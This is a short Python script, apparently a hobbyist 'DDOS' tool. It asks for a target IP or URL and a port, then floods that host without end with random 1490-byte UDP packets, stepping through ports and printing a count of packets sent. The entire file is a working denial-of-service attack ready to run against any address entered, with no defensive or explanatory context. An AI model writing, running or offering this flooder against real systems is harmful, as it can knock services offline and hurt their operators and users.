import os
import time
import socket
from socket import gethostbyname
import random
import pyfiglet
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
def ddos(sent,port):
     global ip
     while True:
          sock.sendto(bytes, (ip, int(port)))
          sent = sent + 1
          port = port + 1
          print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
          if port == 65534:
               port = 1
def gethost(url):
     output = ''
     if '//' in url:
          output = url.split('//')[1]
          if '/' in output:
               output = output.split('/')[0]
     elif '/' in url:
          output = url.split('/')[0]
     return output
def getip(url):
     return gethostbyname(gethost(url))
os.system('cls' if os.name == 'nt' else 'clear')
print(pyfiglet.figlet_format("DDOS"))
ip = input("IP Target/URL : ")
if '//' in ip or 'https' in ip:
     ip = getip(ip)
port = input("Port          : ")
os.system('cls' if os.name == 'nt' else 'clear')
print(pyfiglet.figlet_format("Attack Starting"))
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
port = int(port)
while True:
     ddos(sent, port)
